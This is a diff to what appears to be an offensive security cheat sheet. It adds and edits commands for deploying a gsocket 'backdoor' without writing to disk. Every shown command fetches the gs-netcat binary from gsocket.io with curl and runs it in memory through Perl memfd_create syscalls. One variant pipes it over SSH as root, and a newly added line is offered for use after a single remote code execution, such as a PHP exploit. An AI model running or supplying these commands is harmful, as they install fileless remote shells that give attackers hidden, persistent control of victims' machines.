@@ -2043,13 +2043,18 @@ exec {"/proc/$$/fd/$f"} '"${strargv0}"'@ARGV or die "exec: $!";' -- "$@"
 
 Deploy gsocket without writing to the filesystem (example):
 ```sh
-GS_ARGS="-ilqD -s 5sLosWHZLpE9riqt74KvG9" memexec <(curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m))
+GS_ARGS="-ilqD -s SecretChangeMe31337" memexec <(curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m))
 ```
 
 The backdoor can also be piped via SSH directly into the remote's memory, and executed:
 ```sh
 MX="perl -e '\$f=syscall(319,\$n=\"\",1);if(-1==\$f){\$f=syscall(279,\$n,1);}open(\$o,\">&=\".\$f);while(<STDIN>){print \$o \$_;};exec {\"/proc/\$\$/fd/\$f\"} foo, @ARGV' --"
-curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | ssh root@foobar "exec $MX -ilqD -s 5sLosWHZLpE9riqt74KvG9"
+curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | ssh root@foobar "exec $MX -ilqD -s SecretChangeMe31337"
+```
+
+If you have a single-shot at remote executing a command (like via a PHP exploit) then this is your line:
+```sh
+curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m) | perl -e '$f=syscall(319,$n="",1);if(-1==$f){$f=syscall(279,$n,1);}open($o,">&=".$f);while(<STDIN>){print $o $_;};exec {"/proc/$$/fd/$f"} foo, @ARGV' -- -ilqD -s SecretChangeMe31337
 ```
 
 ---
